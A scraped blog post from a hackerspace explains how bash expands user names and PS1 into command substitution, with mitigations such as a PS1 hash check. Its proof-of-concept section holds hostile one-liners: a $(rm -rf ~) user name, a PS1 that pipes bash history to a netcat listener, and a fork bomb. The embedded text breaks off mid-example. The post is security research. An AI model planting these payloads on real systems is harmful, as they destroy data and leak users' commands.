<p>There have even been recent debates9 about what kinds of special characters, non-ASCII character sets, or other patterns warrant closer scrutiny in Debian user names.  While it is understandable and perhaps even supportable that many users want characters beyond ASCII, great care should be taken to avoid introducing new security risks.  The case of character confusion over identical- or similar-appearing unicode characters is a prime example.  One must expect that any broad increase in complexity will inevitably carry with it new security risks, and prepare accordingly.</p>
<p>Prompt command substitution is powerful, flexible, and completely agnostic towards your security concerns.  Many of the above examples can be combined for greater effect.  Have fun experimenting with them, and try not to erase your home folder while you're at it!</p>
<h1>Acknowledgements</h1>
<p>Thanks to Ben Kallus and Jonah Weinberg for ideas and discussions, and for originally identifying user name command substitution.  Additional thanks to Solra Bizna and Pips of 801 Labs for peer review.</p>
<h1>References</h1>
<ol>
<li>
<p>Bratus, et al. Curing the Vulnerable Parser: Design Patterns for Secure Input Handling.  Usenix ;login:, Spring 2017 Vol. 42, NO. 1, 32-39</p>
</li>
<li>
<p><a href="https://www.gnu.org/software/bison/">https://www.gnu.org/software/bison/</a></p>
</li>
<li>
<p><a href="https://www.cs.utexas.edu/~novak/yaccpaper.htm">https://www.cs.utexas.edu/~novak/yaccpaper.htm</a></p>
</li>
<li>
<p><a href="https://savannah.gnu.org/patch/?10496">https://savannah.gnu.org/patch/?10496</a></p>
</li>
<li>
<p><a href="https://git.savannah.gnu.org/git/bash.git">https://git.savannah.gnu.org/git/bash.git</a>, branch 'devel' commit 25e213a, 24 Jan 2025.</p>
</li>
<li>
<p><a href="https://manpages.debian.org/bookworm/ash/ash.1.en.html">https://manpages.debian.org/bookworm/ash/ash.1.en.html</a></p>
</li>
<li>
<p><a href="https://zsh.sourceforge.io/Doc/Release/Prompt-Expansion.html">https://zsh.sourceforge.io/Doc/Release/Prompt-Expansion.html</a></p>
</li>
<li>
<p><a href="https://mattcasmith.net/2022/02/22/bash-history-basics-behaviours-forensics">https://mattcasmith.net/2022/02/22/bash-history-basics-behaviours-forensics</a></p>
</li>
<li>
<p><a href="https://lwn.net/ml/all/Zz9xogrnHDSFjZUn@torres.zugschlus.de/">https://lwn.net/ml/all/Zz9xogrnHDSFjZUn@torres.zugschlus.de/</a></p>
</li>
</ol>
</div></div></div></main><footer class="page-footer bg-lime-900 text-white pt-10 pb-16"><div class="container-1200 mx-auto px-5"><ul class="flex flex-wrap justify-center mb-10"><li class="m-3"><a class="link--white" href="https://discord.gg/uRSthurdPY" rel="noopener" target="_blank" title="Discord"><span class="sr-only">Discord</span><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="discord" class="svg-inline--fa fa-discord fa-w-20 fa-3x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M524.531,69.836a1.5,1.5,0,0,0-.764-.7A485.065,485.065,0,0,0,404.081,32.03a1.816,1.816,0,0,0-1.923.91,337.461,337.461,0,0,0-14.9,30.6,447.848,447.848,0,0,0-134.426,0,309.541,309.541,0,0,0-15.135-30.6,1.89,1.89,0,0,0-1.924-.91A483.689,483.689,0,0,0,116.085,69.137a1.712,1.712,0,0,0-.788.676C39.068,183.651,18.186,294.69,28.43,404.354a2.016,2.016,0,0,0,.765,1.375A487.666,487.666,0,0,0,176.02,479.918a1.9,1.9,0,0,0,2.063-.676A348.2,348.2,0,0,0,208.12,430.4a1.86,1.86,0,0,0-1.019-2.588,321.173,321.173,0,0,1-45.868-21.853,1.885,1.885,0,0,1-.185-3.126c3.082-2.309,6.166-4.711,9.109-7.137a1.819,1.819,0,0,1,1.9-.256c96.229,43.917,200.41,43.917,295.5,0a1.812,1.812,0,0,1,1.924.233c2.944,2.426,6.027,4.851,9.132,7.16a1.884,1.884,0,0,1-.162,3.126,301.407,301.407,0,0,1-45.89,21.83,1.875,1.875,0,0,0-1,2.611,391.055,391.055,0,0,0,30.014,48.815,1.864,1.864,0,0,0,2.063.7A486.048,486.048,0,0,0,610.7,405.729a1.882,1.882,0,0,0,.765-1.352C623.729,277.594,590.933,167.465,524.531,69.836ZM222.491,337.58c-28.972,0-52.844-26.587-52.844-59.239S193.056,219.1,222.491,219.1c29.665,0,53.306,26.82,52.843,59.239C275.334,310.993,251.924,337.58,222.491,337.58Zm195.38,0c-28.971,0-52.843-26.587-52.843-59.239S388.437,219.1,417.871,219.1c29.667,0,53.307,26.82,52.844,59.239C470.715,310.993,447.538,337.58,417.871,337.58Z"></path></svg></a></li><li class="m-3"><a class="link--white" href="https://twitter.com/801labs" rel="noopener" target="_blank" title="Twitter"><span class="sr-only">Twitter</span><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="twitter-square" class="svg-inline--fa fa-twitter-square fa-w-14 fa-3x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-48.9 158.8c.2 2.8.2 5.7.2 8.5 0 86.7-66 186.6-186.6 186.6-37.2 0-71.7-10.8-100.7-29.4 5.3.6 10.4.8 15.8.8 30.7 0 58.9-10.4 81.4-28-28.8-.6-53-19.5-61.3-45.5 10.1 1.5 19.2 1.5 29.6-1.2-30-6.1-52.5-32.5-52.5-64.4v-.8c8.7 4.9 18.9 7.9 29.6 8.3a65.447 65.447 0 0 1-29.2-54.6c0-12.2 3.2-23.4 8.9-33.1 32.3 39.8 80.8 65.8 135.2 68.6-9.3-44.5 24-80.6 64-80.6 18.9 0 35.9 7.9 47.9 20.7 14.8-2.8 29-8.3 41.6-15.8-4.9 15.2-15.2 28-28.8 36.1 13.2-1.4 26-5.1 37.8-10.2-8.9 13.1-20.1 24.7-32.9 34z"></path></svg></a></li><li class="m-3"><a class="link--white" href="https://www.meetup.com/801labs/" rel="noopener" target="_blank" title="Meetup"><span class="sr-only">Meetup</span><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="meetup" class="svg-inline--fa fa-meetup fa-w-16 fa-3x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M99 414.3c1.1 5.7-2.3 11.1-8 12.3-5.4 1.1-10.9-2.3-12-8-1.1-5.4 2.3-11.1 7.7-12.3 5.4-1.2 11.1 2.3 12.3 8zm143.1 71.4c-6.3 4.6-8 13.4-3.7 20 4.6 6.6 13.4 8.3 20 3.7 6.3-4.6 8-13.4 3.4-20-4.2-6.5-13.1-8.3-19.7-3.7zm-86-462.3c6.3-1.4 10.3-7.7 8.9-14-1.1-6.6-7.4-10.6-13.7-9.1-6.3 1.4-10.3 7.7-9.1 14 1.4 6.6 7.6 10.6 13.9 9.1zM34.4 226.3c-10-6.9-23.7-4.3-30.6 6-6.9 10-4.3 24 5.7 30.9 10 7.1 23.7 4.6 30.6-5.7 6.9-10.4 4.3-24.1-5.7-31.2zm272-170.9c10.6-6.3 13.7-20 7.7-30.3-6.3-10.6-19.7-14-30-7.7s-13.7 20-7.4 30.6c6 10.3 19.4 13.7 29.7 7.4zm-191.1 58c7.7-5.4 9.4-16 4.3-23.7s-15.7-9.4-23.1-4.3c-7.7 5.4-9.4 16-4.3 23.7 5.1 7.8 15.6 9.5 23.1 4.3zm372.3 156c-7.4 1.7-12.3 9.1-10.6 16.9 1.4 7.4 8.9 12.3 16.3 10.6 7.4-1.4 12.3-8.9 10.6-16.6-1.5-7.4-8.9-12.3-16.3-10.9zm39.7-56.8c-1.1-5.7-6.6-9.1-12-8-5.7 1.1-9.1 6.9-8 12.6 1.1 5.4 6.6 9.1 12.3 8 5.4-1.5 9.1-6.9 7.7-12.6zM447 138.9c-8.6 6-10.6 17.7-4.9 26.3 5.7 8.6 17.4 10.6 26 4.9 8.3-6 10.3-17.7 4.6-26.3-5.7-8.7-17.4-10.9-25.7-4.9zm-6.3 139.4c26.3 43.1 15.1 100-26.3 129.1-17.4 12.3-37.1 17.7-56.9 17.1-12 47.1-69.4 64.6-105.1 32.6-1.1.9-2.6 1.7-3.7 2.9-39.1 27.1-92.3 17.4-119.4-22.3-9.7-14.3-14.6-30.6-15.1-46.9-65.4-10.9-90-94-41.1-139.7-28.3-46.9.6-107.4 53.4-114.9C151.6 70 234.1 38.6 290.1 82c67.4-22.3 136.3 29.4 130.9 101.1 41.1 12.6 52.8 66.9 19.7 95.2zm-70 74.3c-3.1-20.6-40.9-4.6-43.1-27.1-3.1-32 43.7-101.1 40-128-3.4-24-19.4-29.1-33.4-29.4-13.4-.3-16.9 2-21.4 4.6-2.9 1.7-6.6 4.9-11.7-.3-6.3-6-11.1-11.7-19.4-12.9-12.3-2-17.7 2-26.6 9.7-3.4 2.9-12 12.9-20 9.1-3.4-1.7-15.4-7.7-24-11.4-16.3-7.1-40 4.6-48.6 20-12.9 22.9-38 113.1-41.7 125.1-8.6 26.6 10.9 48.6 36.9 47.1 11.1-.6 18.3-4.6 25.4-17.4 4-7.4 41.7-107.7 44.6-112.6 2-3.4 8.9-8 14.6-5.1 5.7 3.1 6.9 9.4 6 15.1-1.1 9.7-28 70.9-28.9 77.7-3.4 22.9 26.9 26.6 38.6 4 3.7-7.1 45.7-92.6 49.4-98.3 4.3-6.3 7.4-8.3 11.7-8 3.1 0 8.3.9 7.1 10.9-1.4 9.4-35.1 72.3-38.9 87.7-4.6 20.6 6.6 41.4 24.9 50.6 11.4 5.7 62.5 15.7 58.5-11.1zm5.7 92.3c-10.3 7.4-12.9 22-5.7 32.6 7.1 10.6 21.4 13.1 32 6 10.6-7.4 13.1-22 6-32.6-7.4-10.6-21.7-13.5-32.3-6z"></path></svg></a></li><li class="m-3"><a class="link--white" href="https://www.youtube.com/c/801LabsSaltLakeCity" rel="noopener" target="_blank" title="YouTube"><span class="sr-only">YouTube</span><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="youtube" class="svg-inline--fa fa-youtube fa-w-18 fa-3x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"></path></svg></a></li><li class="m-3"><a class="link--white" href="https://github.com/801labs/" rel="noopener" target="_blank" title="GitHub"><span class="sr-only">GitHub</span><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" class="svg-inline--fa fa-github fa-w-16 fa-3x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a></li></ul><div class="grid grid-cols-2 lg:grid-cols-4 gap-5 mb-10"><div><h2 class="mb-4 fluid-text-lg uppercase"><a class="link--white" href="/about/">About</a></h2><ul class="space-y-2"><li><a class="link--white" href="/about/financial-information/">Financial Information</a></li><li><a class="link--white" href="/about/news/1/">News</a></li></ul></div><div><h2 class="mb-4 fluid-text-lg uppercase"><a class="link--white" href="/research-portal/1/">Learn</a></h2></div><div><h2 class="mb-4 fluid-text-lg uppercase"><a class="link--white" href="/get-involved/">Get Involved</a></h2><ul class="space-y-2"><li><a class="link--white" href="/get-involved/events/">Events</a></li><li><a class="link--white" href="/get-involved/location-and-hours/">Location and Hours</a></li><li><a class="link--white" href="/hackercamp/">Hackercamp</a></li></ul></div><div><h2 class="mb-4 fluid-text-lg uppercase"><a class="link--white" href="/nonprofit/">Nonprofit</a></h2></div><div><h2 class="mb-4 fluid-text-lg uppercase"><a class="link--white" href="/contact/">Contact Us</a></h2></div></div><div class="border-t border-white fluid-text-sm text-center pt-10 space-y-5"><p>© <!-- -->2025<!-- --> 801Labs.org. All rights reserved.</p><p><a class="link--tangerine uppercase" href="/donate/">Donate &gt;</a></p><p>801 Labs hackerspace is a 501(c)(3) that is open to the public!<br/>353 East 200 South Suite #201, Salt Lake City, UT 84111</p><p><a class="link--tangerine" href="/code-of-conduct/">Code of Conduct</a><span class="mx-3">|</span><a class="link--tangerine" href="/terms/">Terms</a></p></div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"allTags":{"bash":"bash","biohacking":"biohacking","buffer-overflow":"buffer overflow","command-injection":"command injection","development":"Development","dll-injection":"DLL Injection","domains":"domains","ee":"EE","how-to":"how to","ipv6":"IPv6","langsec":"langsec","linux":"linux","makefile":"Makefile","memory":"memory","parsing":"parsing","pcap":"pcap","phishing":"phishing","re":"RE","research":"research","rfid":"RFID","shell":"shell","story":"Story","tutorial":"Tutorial","windows-api":"Windows API","windows-hacking":"Windows Hacking"},"title":"Stupid bash tricks- command substitution, command injection, and the bash command prompt","slug":"bash-command-injection","date_published":1738034100000,"date_updated":1738034100000,"tags":["linux","shell","bash","command injection","parsing","langsec"],"excerpt":"It turns out you can use special characters in linux names.  What could possibly go wrong?","cover":"2024/01/bash-source.png","author":{"name":"MalcolmS","avatar":"avatars/malcolms.jpg"},"content":"\u003cp\u003eIt turns out you can use special characters in linux user names.  Cute, but it can have some unexpected consequences.  Be glad your user name isn’t \u003ccode\u003e$(rm -rf ~)\u003c/code\u003e for instance.  Can you guess what happens when you open up your first interactive bash shell?\u003c/p\u003e\n\u003ch1\u003eCommand Substitution\u003c/h1\u003e\n\u003cp\u003eYup, command substitution happens.  Bye bye, files.  Bash, like all good shells, will take the output of a command contained within $() or `` (backticks) and substitute the command’s output into the string where the command was.  Pretty handy for all kinds of shell tasks, and it even works in the prompt definition string.  Even if your user name happens to be an injected command!\u003c/p\u003e\n\u003cp\u003eThis happens because it's typical for the prompt to contain the user name.  Bash uses the environment variable, PS1 to define the prompt string.  Escaped characters like \\u and \\w, for instance, get expanded into other strings that are useful for dynamic prompt components, like the user name or working directory.  But even more flexibility comes from substituting the output of an arbitrary command.  In the above example, the \\u in the prompt string gets substituted by \u003ccode\u003e$(rm -rf ~)\u003c/code\u003e, which then gets substituted by the output of running that command.  Even if the command yields no output, it has still been run.\u003c/p\u003e\n\u003cp\u003eBash also recognizes PS2, PS3, and PS4, for various, less-commonly seen prompts.  PS2 is probably most familiar to the average user as the \"\u003e \" prompt when entering a multi-line command.  All the parsing and command substitution topics discussed below also apply to those prompts, but they are less frequently encountered.  Other than to briefly note here that they might provide a more obscure or niche attack vector, they will not be discussed further in this writeup.\u003c/p\u003e\n\u003ch1\u003eParsing\u003c/h1\u003e\n\u003cp\u003eShells have to do a lot of parsing, and do it correctly, every time.  Writing good parsers is actually really hard, in part because it’s so easy to write vulnerable code.  It’s been suggested that writing parsers should be done as rigorously as writing cryptographic libraries1– in other words, don’t “roll your own.”\u003c/p\u003e\n\u003cp\u003eIf you need a parser that doesn’t already exist, and don’t want to write it from scratch yourself, you’re in luck.  General purpose parser generators, like GNU Bison2, Yacc (Yet Another Compiler Compiler)3 and various others take a user-defined, context free grammar and use it to output code (C, in this case) that performs the corresponding parsing for you.\u003c/p\u003e\n\u003cp\u003eThe bash code base employs Bison to generate a core function called yyparse from the grammar defined in \u003ccode\u003eparse.y\u003c/code\u003e.  This file also contains C code snippets which Bison copies directly, along with the generated yyparse, into a source file called \u003ccode\u003ey.tab.c\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eWhen parsing \u003ccode\u003ePS1\u003c/code\u003e, Bash expands \\ characters (like \\u and \\w) before it performs command substitution.  This is why \u003ccode\u003e\\u\u003c/code\u003e -\u003e \u003ccode\u003e$(rm -rf ~)\u003c/code\u003e -\u003e \u003ccode\u003e\u0026#x3C;command execution\u003e\u003c/code\u003e.  But suppose that your working path contains a directory named \u003ccode\u003e$(ls)\u003c/code\u003e?  Will \u003ccode\u003els\u003c/code\u003e be run?  In this case, actually, no.  The reason is that the bash source code (in \u003ccode\u003eparse.y\u003c/code\u003e, function \u003ccode\u003edecode_prompt_string\u003c/code\u003e) puts the directory string into double quotes, masking it from future expansion.\u003c/p\u003e\n\u003cp\u003eAs of the latest stable release at the time of this writeup (5.2), bash doesn’t double-quote user names after expansion from \\u, though.  The good news: the expanded \\u will be double-quoted in a future release.4,5  This exempts the user name string from being parsed for command substitution.\u003c/p\u003e\n\u003cp\u003eWhen bash finds a command substitution that it needs to parse in \u003ccode\u003ePS1\u003c/code\u003e, it begins a series of nested calls starting with \u003ccode\u003edecode_prompt_string\u003c/code\u003e in \u003ccode\u003eparse.y\u003c/code\u003e, and going back and forth between routines in \u003ccode\u003eparse.y\u003c/code\u003e, \u003ccode\u003esubst.c\u003c/code\u003e, and \u003ccode\u003ebuiltins/evalstring.c\u003c/code\u003e, early on joining the common pathway of command substitution, and ultimately calling \u003ccode\u003eexecute_command_internal\u003c/code\u003e in \u003ccode\u003eexecute_cmd.c\u003c/code\u003e.  The subshell created to do this captures the output of the command and returns it to \u003ccode\u003edecode_prompt_string\u003c/code\u003e, and that goes into your prompt string.\u003c/p\u003e\n\u003cp\u003eNote: This article specifically focuses on how bash does this, but some other shells will do it in their own way, too.  [D]ash will execute commands, as will zsh if you first enable the PROMPT_SUBST (promptsubst) option,6,7 but many others will not.\u003c/p\u003e\n\u003cp\u003eIt’s worth mentioning that commands executed via substitution don’t make it, by themselves, into the \u003ccode\u003e.bash_history\u003c/code\u003e file.  And why should they?  These substitutions are helpers that are often part of scripts or other automated tasks.  The history file would fill up quickly with chaff unless it ignored all of these commands.  Generally speaking, only commands typed into the CLI make it into history.  For more information, see the history man page, or a nice writeup by MattCASmith.8\u003c/p\u003e\n\u003ch1\u003eThe Command Prompt\u003c/h1\u003e\n\u003cp\u003eCommand substitution is, of course, an indispensable part of shells.  And it’s a convenient way to inject useful dynamic text into your prompt string.  But if you simply want to execute a command before every prompt, command substitution in the prompt string is not your “go-to” way to do this.\u003c/p\u003e\n\u003cp\u003eFor that purpose, bash offers the user an environment variable called \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e, and it runs this command before it gets into the business of generating each command prompt.  \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e can also work in concert with \u003ccode\u003ePS1\u003c/code\u003e, depending on how you wanted to do things.  But almost anything you can do with \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e can also be crammed into \u003ccode\u003ePS1\u003c/code\u003e, with at least one major exception.  \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e commands are executed in the current shell, but \u003ccode\u003ePS1\u003c/code\u003e substituted commands are performed in a subshell.  The impact of this is that environment changes in the subshell die with the subshell and do not back-propagate to the parent shell.  So, output redirection and environment variable changes are durable if done by \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e, but ephemeral if done by \u003ccode\u003ePS1\u003c/code\u003e.  Another difference: \u003ccode\u003ePS1\u003c/code\u003e will expand special escape characters, such as ‘\\u’ for user names, as mentioned above, but \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e will not.\u003c/p\u003e\n\u003cp\u003eDifferent linux distributions and shells tend to offer their own default versions of what they consider to be a useful and aesthetic prompt.  But many users customize \u003ccode\u003ePS1\u003c/code\u003e to suit their own needs.  One category of uses is for presenting timely information.  For instance, you might have it display your IP address, or change colors depending on the most recent exit status, or show which git branch is checked out in your working directory.\u003c/p\u003e\n\u003cp\u003eAnother category of uses involves automating frequent tasks or checks.  For instance, commands run by \u003ccode\u003ePS1\u003c/code\u003e or \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e might run \u003ccode\u003ehistory -a\u003c/code\u003e to ensure every regular command that has been executed is written immediately to \u003ccode\u003e.bash_history\u003c/code\u003e instead of waiting until the terminal session closes--which helps prevent loss of history if the shell is SIGKILLed or power is suddenly lost.\u003c/p\u003e\n\u003cp\u003eThis capacity can, of course, be used for mischief in the wrong hands.  It may seem like an inefficient method for an attacker, because if they can change an environment variable for your prompt, they can probably execute other code, so why would they bother with this?\u003c/p\u003e\n\u003cp\u003eOne scenario involves the delivery phase.  A threat actor may have only a brief window of opportunity to enter commands on a keyboard.  Or, they might social engineer a victim to run a malicious script which edits \u003ccode\u003ePS1\u003c/code\u003e or \u003ccode\u003e.bashrc\u003c/code\u003e.  These opportunities might establish a foothold.  Another scenario might involve an attacker who already owns the victim’s account, but needs to avoid certain canaries or countermeasures.\u003c/p\u003e\n\u003cp\u003eYet another, potentially powerful exploit, could involve a compromised authentication server.  If an attacker can add or control account names in the server's database, providing a login as \u003ccode\u003e$(some-command)\u003c/code\u003e might allow for code execution on an otherwise hardened network host.  \u003ccode\u003esome-command\u003c/code\u003e could launch a reverse shell, for instance, to help traverse a firewall.  This is a potential area for future research.\u003c/p\u003e\n\u003ch1\u003eMitigation, Part 1\u003c/h1\u003e\n\u003cp\u003eTo put it simply: if an attacker can control the user name, a defender must watch out for expansion by \\u.  If the attacker can control \u003ccode\u003ePS1\u003c/code\u003e or \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e directly, it doesn't necessarily matter what the user name is; the defender must always protect the environment variables.  These are similar attack vectors that share a common, final pathway.  In practice, both should be guarded against in accordance with one's threat model, resources, and priorities.  Eliminating all command substitution entirely would be an effective, but quite extreme, measure, and one not likely to be worth the costs in most cases.  It would generally require a custom patch, but the change would be easy.  User name-based command substitution, on the other hand, should be less of an issue in future releases (see above).\u003c/p\u003e\n\u003cp\u003eBeyond universal security principles (including hardening and regular audits/updates on any network authentication servers), specific mitigations for command substitution attacks could include periodic or automatic verification of the contents of \u003ccode\u003e.bashrc\u003c/code\u003e, \u003ccode\u003e/etc/environment\u003c/code\u003e, any routine scripts, and specific environment variables.  It’s worth being aware that modules like PAM can also set environment variables, although an exploit at this level would entail more dire concerns.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ePS1\u003c/code\u003e and \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e can both contain commands to validate themselves and/or the other variable, and alert the user if an unexpected state is detected.  \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e could reset \u003ccode\u003ePS1\u003c/code\u003e to a trusted value.  Either could perform validation, for instance by comparing against a trusted value (such as a string or hash stored in a write-protected file).  This would be an imperfect, but relatively inexpensive, method for situations where you could screen for changes in \u003ccode\u003ePS1\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eExample, in .bashrc:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ePROMPT_COMMAND=’echo $PS1 | md5sum -z | diff ~/.myPS1hash - \u003e /dev/null;\\\nif [[ $? -gt 0 ]]; then\\\n      echo Warning, PS1 altered;\\\n    else\\\n      echo PS1 OK;\\\nfi; # ugly\n\nOr in PS1:\nPS1='$( \\\n    echo $PS1 | md5sum -z | diff -q - ~/.myPS1hash \u003e/dev/null; \n    if [[ $? -eq 0 ]]; then \\\n        echo -e \"\\033[1;32m\\u@\\h:\\w\\\\$ \\033[0m\"; \\ # Green text means OK\n    else \\\n        echo -e \"\\033[1;31m\\u@\\h:\\w\\\\$ \\033[0m\"; \\ # Red text is bad\n    fi )' # less ugly\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOnce you set your new \u003ccode\u003ePS1\u003c/code\u003e, just \u003ccode\u003eecho $PS1 | md5sum -z \u003e ~/.myPS1hash\u003c/code\u003e and make sure it is write protected, or give ownership to root, or put it on a read-only medium.\u003c/p\u003e\n\u003ch1\u003eMitigation, Part 2\u003c/h1\u003e\n\u003cp\u003eSince this is, essentially, a screening methodology, it is worth interjecting a few words on proper screening test design.\u003c/p\u003e\n\u003cp\u003eAn ideal screening test is fast, cheap and highly sensitive, at the expense of specificity.  In other words, you accept the burden of many false positive results, for the benefit of being less likely to miss a true positive event.  Given that a test which is fast and cheap will probably suffer costs in the accuracy department, the screening test is usually intentionally tuned to favor flagging something as abnormal if there’s any uncertainty.  The mitigation strategy described so far, of checking for changes in variables, is highly specific, i.e. it’s not likely to falsely report a change in a string.  But, it’s not very sensitive, i.e. there are many ways an effective attacker could defeat it.  In other words, it’s the opposite of what a good screening test should be, in at least some ways.\u003c/p\u003e\n\u003cp\u003eUnfortunately, in cybersecurity, sensitivity is an ever-elusive goal.  With intelligent adversaries trying to be as undetectable as possible, creating a high sensitivity screening test for this situation can be very difficult.  Easy screening methods for this attack all basically depend on the attacker not being aware of, nor bothering to try, circumvention.\u003c/p\u003e\n\u003cp\u003eNot only are simple detection methods easy to circumvent, but robust detection methods are hard to create.  Indeed, a specific challenge here is that it is tough to actively monitor these variables from outside the shell itself.  \u003ccode\u003e/proc/\u0026#x3C;pid\u003e/environ\u003c/code\u003e can helpfully show the shell’s initial environment, but it only updates when the process starts, and is therefore insufficient.  Following an environment variable directly from outside the shell would probably require something on the level of a ptrace system call.  Now we’re getting into some pretty invasive monitoring, which is less easy to set up and may entail significant performance costs.  One could indirectly follow environment variables by periodically exporting the environment to a file, and ensuring a daemon monitors that file.  But even that method suffers from various weaknesses, especially if it depends on \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e or \u003ccode\u003ePS1\u003c/code\u003e themselves to do the exporting.  There are open source tools that may be able to monitor a process' internal environment, but they are untested by this author.\u003c/p\u003e\n\u003ch1\u003eMischief\u003c/h1\u003e\n\u003cp\u003eThe point is not to present malicious code here, but to provide proof of concept for non-trivial attacks, such as denial of service, data destruction, or exfiltration.  And while pretty much all of these could be adapted into \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e, they are simply shown here in \u003ccode\u003ePS1=\u003c/code\u003e form to highlight command substitution.\u003c/p\u003e\n\u003cp\u003eOne thing an attacker wouldn’t want to do, would be to make an obvious change to the appearance of the command prompt itself.  The following examples assume a basic command prompt appearance for simplicity's sake, but a better approach might involve \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e capturing the original \u003ccode\u003ePS1\u003c/code\u003e into a backup variable, so then \u003ccode\u003ePS1\u003c/code\u003e can invoke that backup variable to recreate the original appearance.\u003c/p\u003e\n\u003ch3\u003eExamples (i.e. PS1=' ', using single quotes)\u003c/h3\u003e\n\u003cp\u003eNuisances: Injecting delays, screen clearing pranks\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e'$(sleep 2)\\u@\\h:\\w$ '\n'$(clear)\\u@\\h:\\w$ '\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSnooping on command history:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e'$(history -a; tail -n 1 ~/.bash_history | nc -q 0 localhost 12345)\\u@\\h:\\w$ '\n# set up a listener on localhost 12345 to snoop on what the user is running.\n# nc -u might be necessary or simpler in some cases, too.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThere are limits to how real-time you can snoop.  You might expect this would allow for complete output logging:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e'$([[ -t 1 ]] \u0026#x26;\u0026#x26; exec \u003e \u003e(tee \u003e(nc -q 0 localhost 12345)) 2\u003e\u0026#x26;1)\\u@\\h:\\w$ '\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBut, this does not work.  The command is run in a sub-shell, so any output redirection method that is born there, dies there.  This aspect makes it hard, if not impossible, to use output redirection as intended. (Prove me wrong, though!)\u003c/p\u003e\n\u003cp\u003eFork bombing (see evading, below):\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e'`bomb() { bomb | bomb\u0026#x26; }; bomb`\\u@\\h:\\w$ '\n# can obfuscate easily by replacing 'bomb' with a single 